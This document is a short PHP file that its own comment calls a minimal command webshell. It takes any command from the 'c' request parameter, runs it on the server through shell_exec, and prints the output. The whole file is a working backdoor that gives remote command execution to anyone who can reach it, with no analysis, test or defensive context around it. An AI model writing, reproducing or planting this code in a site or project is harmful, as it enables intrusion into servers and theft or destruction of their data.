<?php
// Minimal command webshell.  Usage: shell.php?c=id   (POST c=... also works)
if (isset($_REQUEST['c'])) {
    header('Content-Type: text/plain');
    echo shell_exec($_REQUEST['c'] . ' 2>&1');
}
?>
